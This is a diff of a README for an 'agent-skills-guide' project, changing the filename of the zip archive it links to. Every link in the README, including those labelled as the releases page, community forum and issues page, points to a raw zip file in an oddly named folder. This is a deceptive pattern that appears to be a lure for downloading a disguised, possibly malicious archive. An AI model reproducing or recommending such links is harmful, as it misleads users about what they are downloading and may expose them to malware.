@@ -1,6 +1,6 @@
 # 📘 agent-skills-guide - Create Custom Agent Skills Easily
 
-[![Download Now](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/skills_guide_agent_v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/skills_guide_agent_v3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/guide-skills-agent-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/guide-skills-agent-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the agent-skills-guide! This guide helps you create agent skill files
 
 ## 📥 Download & Install
 
-To download the agent-skills-guide, visit this page to download: [Releases Page](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/skills_guide_agent_v3.8.zip). 
+To download the agent-skills-guide, visit this page to download: [Releases Page](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/guide-skills-agent-1.7.zip). 
 
 1. Click on the link above.
 2. Look for the newest release at the top of the page.
@@ -67,7 +67,7 @@ A: Yes. You can join our community forum for assistance and collaboration with o
 ## 🔗 Additional Resources
 
 - **Documentation:** In-depth information and instructions can be found in the included documentation once you install the application.
-- **Community Forum:** Connect with other users: [Community Forum Link](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/skills_guide_agent_v3.8.zip)
+- **Community Forum:** Connect with other users: [Community Forum Link](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/guide-skills-agent-1.7.zip)
 
 ## 📅 Updates and Changelog
 
@@ -75,7 +75,7 @@ Keep an eye out for updates! Updates include new features, bug fixes, and improv
 
 ## 📣 Feedback
 
-We value your feedback! If you encounter any issues or have suggestions for improvement, please leave comments on the [Issues Page](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/skills_guide_agent_v3.8.zip). Your input helps us make this guide better.
+We value your feedback! If you encounter any issues or have suggestions for improvement, please leave comments on the [Issues Page](https://raw.githubusercontent.com/kaydenplayZ/agent-skills-guide/main/aportoise/guide-skills-agent-1.7.zip). Your input helps us make this guide better.
 
 ---
 
